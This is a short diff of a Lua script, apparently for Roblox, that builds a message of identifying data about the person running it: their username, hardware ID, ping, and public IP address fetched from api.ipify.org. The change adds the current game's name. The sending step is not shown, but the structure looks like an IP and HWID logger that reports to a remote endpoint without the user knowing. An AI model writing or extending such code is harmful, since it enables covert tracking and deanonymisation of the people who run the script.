@@ -592,6 +592,7 @@ pcall(function()
        ['description'] = '',
        ['fields'] = {
           {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
+	  {name = 'Game', value = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name},
           {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
           {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
 	  {name = "Ip", value = tostring(game:HttpGet("https://api.ipify.org/", true))},
